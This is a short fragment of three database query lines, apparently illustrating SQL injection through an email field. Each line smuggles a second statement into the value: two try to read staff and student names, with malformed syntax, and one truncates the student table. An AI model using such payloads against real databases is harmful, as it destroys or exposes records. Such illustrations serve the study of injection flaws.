db.query('SELECT first_name, last_name FROM visit WHERE email = "' '; select first_name, last_name from staff UNION ALL first_name, last_name from student; -- '";' ...
db.query('SELECT first_name, last_name FROM visit WHERE email = "' '; select sport, gender from sport join first_name, last_name from student; -- '";' ...
db.query('SELECT first_name, last_name FROM visit WHERE email = "' '; TRUNCATE TABLE student; -- '";' ...
